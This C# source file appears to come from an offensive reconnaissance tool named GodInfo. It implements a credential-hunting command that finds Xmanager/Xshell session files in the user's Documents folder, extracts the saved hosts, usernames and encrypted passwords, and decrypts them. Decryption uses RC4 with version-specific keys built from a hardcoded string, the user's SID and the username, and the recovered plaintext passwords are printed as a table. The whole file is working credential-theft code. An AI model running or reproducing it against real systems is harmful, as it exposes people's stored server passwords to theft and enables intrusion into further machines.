using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using GodInfo.Utils;

namespace GodInfo.Commands
{
    public class XmanagerCredCommand : ICommand
    {
        public struct ConnectionInfo
        {
            public string Name;
            public string Version;
            public string Host;
            public string Port;
            public string Username;
            public string Password;
        }

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by Xmanager.");
            GetXmanagerCred();
        }

        public static bool CheckXmanagerCredExists()
        {
            string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(documentsPath))
            {
                return false;
            }

            try
            {
                // 检查是否有Xmanager会话文件
                return Directory.GetFiles(documentsPath, "*.xsh", SearchOption.AllDirectories).Length > 0 ||
                       Directory.GetFiles(documentsPath, "*.xfp", SearchOption.AllDirectories).Length > 0;
            }
            catch
            {
                return false;
            }
        }

        public static void GetXmanagerCred()
        {
            Logger.TaskHeader("Hunting Xmanager", 1);
            
            string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(documentsPath))
            {
                Logger.WriteLine("[-] Could not access user Documents folder.");
                return;
            }

            // 获取当前用户信息，用于解密
            WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
            string sid = currentUser.User.ToString();
            string userName = currentUser.Name.Split('\\')[1];

            Logger.WriteLine($"[*] Current user: {userName}");
            Logger.WriteLine($"[*] Current SID: {sid}");
            
            // 搜索Xmanager会话文件
            List<string> sessionFiles = SearchXmanagerSessions(new DirectoryInfo(documentsPath));
            
            if (sessionFiles.Count == 0)
            {
                Logger.WriteLine("[-] No Xmanager session files found.");
                return;
            }

            Logger.WriteLine($"[+] Found {sessionFiles.Count} Xmanager session file(s).");
            
            List<ConnectionInfo> connections = new List<ConnectionInfo>();
            XmanagerPasswordDecryptor decryptor = new XmanagerPasswordDecryptor();
            
            foreach (string sessionFile in sessionFiles)
            {
                try
                {
                    Logger.WriteLine($"[+] Processing session file: {Path.GetFileName(sessionFile)}");
                    
                    List<string> configs = ReadConfigFile(sessionFile);
                    if (configs.Count < 4)
                    {
                        Logger.WriteLine($"[-] Invalid session file format: {Path.GetFileName(sessionFile)}");
                        continue;
                    }

                    string version = configs[0].Trim();
                    string host = configs[1].Trim();
                    string username = configs[2].Trim();
                    string rawPassword = configs[3].Trim();
                    string port = configs.Count >= 5 ? configs[4].Trim() : string.Empty;

                    string decryptedPassword = decryptor.DecryptPassword(userName, sid, rawPassword, version);
                    
                    ConnectionInfo connection = new ConnectionInfo
                    {
                        Name = Path.GetFileName(sessionFile),
                        Version = version,
                        Host = host,
                        Port = port,
                        Username = username,
                        Password = decryptedPassword
                    };
                    
                    connections.Add(connection);
                }
                catch (Exception ex)
                {
                    Logger.WriteLine($"[-] Error processing session file '{Path.GetFileName(sessionFile)}': {ex.Message}");
                }
            }

            if (connections.Count > 0)
            {
                Logger.WriteLine($"\n[+] Found {connections.Count} Xmanager connection(s):");
                Logger.PrintTableFromStructs(connections);
            }
            else
            {
                Logger.WriteLine("[-] No valid Xmanager credentials found.");
            }
        }

        /// <summary>
        /// 搜索目录中的Xmanager会话文件
        /// </summary>
        private static List<string> SearchXmanagerSessions(DirectoryInfo directory)
        {
            List<string> sessionFiles = new List<string>();
            try
            {
                // 递归搜索所有.xsh和.xfp文件
                foreach (FileInfo file in directory.GetFiles("*.xsh", SearchOption.AllDirectories))
                {
                    sessionFiles.Add(file.FullName);
                }
                
                foreach (FileInfo file in directory.GetFiles("*.xfp", SearchOption.AllDirectories))
                {
                    sessionFiles.Add(file.FullName);
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error searching for Xmanager session files: {ex.Message}");
            }
            
            return sessionFiles;
        }

        /// <summary>
        /// 读取Xmanager配置文件内容
        /// </summary>
        private static List<string> ReadConfigFile(string path)
        {
            List<string> result = new List<string>();
            try
            {
                string fileData = File.ReadAllText(path);
                
                string version = Regex.Match(fileData, "Version=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string host = Regex.Match(fileData, "Host=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string username = Regex.Match(fileData, "UserName=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string password = Regex.Match(fileData, "Password=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string port = Regex.Match(fileData, "\nPort=(.*)", RegexOptions.Multiline).Groups[1].Value;
                
                result.Add(version);
                result.Add(host);
                result.Add(username);
                result.Add(password);
                result.Add(port);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading config file '{path}': {ex.Message}");
            }
            
            return result;
        }
    }

    /// <summary>
    /// Xmanager密码解密实现
    /// </summary>
    internal class XmanagerPasswordDecryptor
    {
        /// <summary>
        /// 根据版本解密Xmanager密码
        /// </summary>
        public string DecryptPassword(string username, string sid, string rawPassword, string version)
        {
            if (string.IsNullOrEmpty(rawPassword) || rawPassword.Length <= 3)
            {
                return string.Empty;
            }

            try
            {
                byte[] data = Convert.FromBase64String(rawPassword);
                byte[] key;
                byte[] passwordData = new byte[data.Length - 0x20]; // 去除尾部校验数据
                Array.Copy(data, 0, passwordData, 0, data.Length - 0x20);

                // 根据不同版本使用不同的密钥生成方式
                if (version.StartsWith("5.0") || version.StartsWith("4") || version.StartsWith("3") || version.StartsWith("2"))
                {
                    // 版本 2.x-4.x 和 5.0.x
                    key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes("!X@s#h$e%l^l&"));
                }
                else if (version.StartsWith("5.1") || version.StartsWith("5.2"))
                {
                    // 版本 5.1.x-5.2.x
                    key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(sid));
                }
                else if (version.StartsWith("5") || version.StartsWith("6") || version.StartsWith("7.0"))
                {
                    // 版本 5.x-6.x 和 7.0.x
                    key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(username + sid));
                }
                else if (version.StartsWith("7") || version.StartsWith("8"))
                {
                    // 版本 7.x-8.x
                    string strkey1 = new string(username.ToCharArray().Reverse().ToArray()) + sid;
                    string strkey2 = new string(strkey1.ToCharArray().Reverse().ToArray());
                    key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(strkey2));
                }
                else
                {
                    return $"[不支持的版本: {version}]";
                }

                byte[] decrypted = RC4Decrypt(key, passwordData);
                return $"[{version}] " + Encoding.ASCII.GetString(decrypted);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error decrypting Xmanager password: {ex.Message}");
                return "[解密失败]";
            }
        }

        #region RC4加密解密实现
        /// <summary>
        /// 使用RC4算法解密数据
        /// </summary>
        private byte[] RC4Decrypt(byte[] key, byte[] data)
        {
            return RC4EncryptOutput(key, data).ToArray();
        }

        /// <summary>
        /// 初始化RC4加密
        /// </summary>
        private byte[] RC4Initialize(byte[] key)
        {
            byte[] s = Enumerable.Range(0, 256)
              .Select(i => (byte)i)
              .ToArray();

            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + key[i % key.Length] + s[i]) & 255;
                Swap(s, i, j);
            }

            return s;
        }

        /// <summary>
        /// RC4加密/解密过程
        /// </summary>
        private IEnumerable<byte> RC4EncryptOutput(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = RC4Initialize(key);
            int i = 0;
            int j = 0;

            return data.Select((b) =>
            {
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;
                Swap(s, i, j);
                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }

        /// <summary>
        /// 交换字节
        /// </summary>
        private void Swap(byte[] s, int i, int j)
        {
            byte c = s[i];
            s[i] = s[j];
            s[j] = c;
        }
        #endregion
    }
} 